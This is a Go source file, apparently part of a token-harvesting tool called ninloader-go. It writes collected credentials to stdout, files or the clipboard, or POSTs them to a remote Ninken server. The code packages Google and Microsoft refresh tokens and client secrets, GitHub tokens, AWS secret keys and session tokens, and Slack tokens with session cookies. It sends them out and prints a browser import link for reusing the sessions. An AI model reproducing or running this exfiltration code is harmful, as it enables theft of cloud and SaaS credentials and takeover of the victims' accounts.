// Package output provides handlers for writing collected tokens to various destinations.
package output

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/ninken/ninloader-go/internal/types"
)

// Handler is the interface all output handlers must implement.
type Handler interface {
	Write(tokens []*types.CollectedToken) error
}

// ---------------------------------------------------------------------------
// StdoutOutput — JSON array to stdout
// ---------------------------------------------------------------------------

// StdoutOutput prints tokens as a JSON array to stdout.
type StdoutOutput struct{}

func (o *StdoutOutput) Write(tokens []*types.CollectedToken) error {
	if len(tokens) == 0 {
		fmt.Println("[]")
		return nil
	}
	data := make([]map[string]any, len(tokens))
	for i, t := range tokens {
		data[i] = t.ToNinkenDict()
	}
	b, err := json.MarshalIndent(data, "", "  ")
	if err != nil {
		return fmt.Errorf("json marshal: %w", err)
	}
	fmt.Println(string(b))
	return nil
}

// ---------------------------------------------------------------------------
// FileOutput — individual JSON files per token, permissions 0600
// ---------------------------------------------------------------------------

// FileOutput writes each token to a separate JSON file with restrictive permissions.
type FileOutput struct {
	Dir string
}

func (o *FileOutput) Write(tokens []*types.CollectedToken) error {
	if len(tokens) == 0 {
		fmt.Fprintln(os.Stderr, "No tokens to write.")
		return nil
	}

	if err := os.MkdirAll(o.Dir, 0700); err != nil {
		return fmt.Errorf("mkdir %s: %w", o.Dir, err)
	}

	for _, token := range tokens {
		ts := time.Now().UTC().Format("20060102_150405")
		filename := fmt.Sprintf("%s_%s_%s.json", token.Service, token.Source, ts)
		filepath := o.Dir + "/" + filename

		b, err := json.MarshalIndent(token.ToNinkenDict(), "", "  ")
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error marshaling %s/%s: %v\n", token.Service, token.Source, err)
			continue
		}

		fd, err := os.OpenFile(filepath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error creating %s: %v\n", filepath, err)
			continue
		}
		if _, err := fd.Write(b); err != nil {
			fd.Close()
			fmt.Fprintf(os.Stderr, "Error writing %s: %v\n", filepath, err)
			continue
		}
		fd.Close()

		fmt.Fprintf(os.Stderr, "Written: %s\n", filepath)
	}

	return nil
}

// ---------------------------------------------------------------------------
// ClipboardOutput — copy token JSON to system clipboard
// ---------------------------------------------------------------------------

// ClipboardOutput copies the JSON-serialized tokens to the system clipboard.
type ClipboardOutput struct{}

func (o *ClipboardOutput) Write(tokens []*types.CollectedToken) error {
	if len(tokens) == 0 {
		fmt.Fprintln(os.Stderr, "No tokens to copy.")
		return nil
	}

	data := make([]map[string]any, len(tokens))
	for i, t := range tokens {
		data[i] = t.ToNinkenDict()
	}
	b, err := json.MarshalIndent(data, "", "  ")
	if err != nil {
		return fmt.Errorf("json marshal: %w", err)
	}

	text := b

	switch runtime.GOOS {
	case "darwin":
		return pipeToCmd(text, "pbcopy")
	case "windows":
		return pipeToCmd(text, "clip")
	default:
		// Try xclip first, then xsel
		err := pipeToCmd(text, "xclip", "-selection", "clipboard")
		if err == nil {
			fmt.Fprintf(os.Stderr, "Copied %d token(s) to clipboard.\n", len(tokens))
			return nil
		}
		err = pipeToCmd(text, "xsel", "--clipboard", "--input")
		if err == nil {
			fmt.Fprintf(os.Stderr, "Copied %d token(s) to clipboard.\n", len(tokens))
			return nil
		}
		return fmt.Errorf("no clipboard utility found (install xclip or xsel)")
	}
}

// pipeToCmd writes data to the stdin of the given command.
func pipeToCmd(data []byte, name string, args ...string) error {
	cmd := exec.Command(name, args...)
	cmd.Stdin = bytes.NewReader(data)
	cmd.Stdout = nil
	cmd.Stderr = nil
	return cmd.Run()
}

// ---------------------------------------------------------------------------
// NinkenOutput — POST tokens to a Ninken server
// ---------------------------------------------------------------------------

// NinkenOutput sends each token to a Ninken server via POST /api/auth/import.
type NinkenOutput struct {
	URL    string
	client *http.Client
}

func (o *NinkenOutput) Write(tokens []*types.CollectedToken) error {
	if len(tokens) == 0 {
		fmt.Fprintln(os.Stderr, "No tokens to send.")
		return nil
	}

	for _, token := range tokens {
		payload := toNinkenPayload(token)
		body, err := json.Marshal(payload)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error marshaling %s/%s: %v\n", token.Service, token.Source, err)
			continue
		}

		url := strings.TrimRight(o.URL, "/") + "/api/auth/import"
		req, err := http.NewRequest("POST", url, bytes.NewReader(body))
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error creating request for %s: %v\n", url, err)
			continue
		}
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Origin", strings.TrimRight(o.URL, "/"))

		resp, err := o.client.Do(req)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error sending to %s: %v\n", url, err)
			continue
		}

		respBody, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		if resp.StatusCode >= 200 && resp.StatusCode < 300 {
			fmt.Fprintf(os.Stderr, "Sent %s/%s [%d]\n", token.Service, token.Source, resp.StatusCode)

			var result map[string]any
			if json.Unmarshal(respBody, &result) == nil {
				if importURL, ok := result["importUrl"].(string); ok && importURL != "" {
					fmt.Fprintf(os.Stderr, "  -> Open in browser: %s\n", importURL)
				}
			}
		} else {
			fmt.Fprintf(os.Stderr, "Warning: %s returned %d: %s\n", url, resp.StatusCode, string(respBody))
		}
	}

	return nil
}

// toNinkenPayload transforms a CollectedToken to the Ninken /api/auth/import payload format.
// Maps to provider-specific shapes based on token.service.
func toNinkenPayload(token *types.CollectedToken) map[string]any {
	base := token.ToNinkenDict()
	t, _ := base["token"].(map[string]any)
	account, _ := base["account"].(map[string]any)

	payload := map[string]any{
		"platform": token.Service,
		"source":   "ninloader:" + token.Source,
	}

	switch token.Service {
	case "google":
		payload["access_token"] = t["access_token"]
		payload["refresh_token"] = t["refresh_token"]
		payload["client_id"] = t["client_id"]
		payload["client_secret"] = t["client_secret"]
		payload["token_uri"] = t["token_uri"]
		payload["scopes"] = t["scopes"]

	case "microsoft":
		payload["access_token"] = t["access_token"]
		payload["refresh_token"] = t["refresh_token"]
		payload["client_id"] = t["client_id"]
		payload["tenant_id"] = account["tenant_id"]
		payload["foci"] = t["foci"]

	case "github":
		payload["token"] = t["access_token"]
		payload["username"] = account["username"]

	case "aws":
		extra, _ := t["extra"].(map[string]any)
		payload["access_key_id"] = t["access_token"]
		payload["secret_access_key"] = t["client_secret"]
		if extra != nil {
			payload["session_token"] = extra["session_token"]
			payload["region"] = extra["region"]
		}

	case "slack":
		extra, _ := t["extra"].(map[string]any)
		payload["token"] = t["access_token"]
		if extra != nil {
			payload["cookie"] = extra["d_cookie"]
		}

	default:
		// Unknown service — include all token fields
		for k, v := range t {
			payload[k] = v
		}
	}

	return payload
}

// ---------------------------------------------------------------------------
// GetHandler — factory function
// ---------------------------------------------------------------------------

// GetHandler creates an output Handler based on the given type.
// outputType must be one of: "stdout", "file", "clipboard", "ninken".
// path is used for file output (default "./tokens").
// ninkenURL is required for ninken output.
func GetHandler(outputType, path, ninkenURL string) (Handler, error) {
	switch outputType {
	case "stdout":
		return &StdoutOutput{}, nil

	case "file":
		dir := path
		if dir == "" {
			dir = "./tokens"
		}
		return &FileOutput{Dir: dir}, nil

	case "clipboard":
		return &ClipboardOutput{}, nil

	case "ninken":
		if ninkenURL == "" {
			return nil, fmt.Errorf("--ninken-url is required for ninken output")
		}
		return &NinkenOutput{
			URL: ninkenURL,
			client: &http.Client{
				Timeout: 30 * time.Second,
			},
		}, nil

	default:
		return nil, fmt.Errorf("unknown output type: %s", outputType)
	}
}
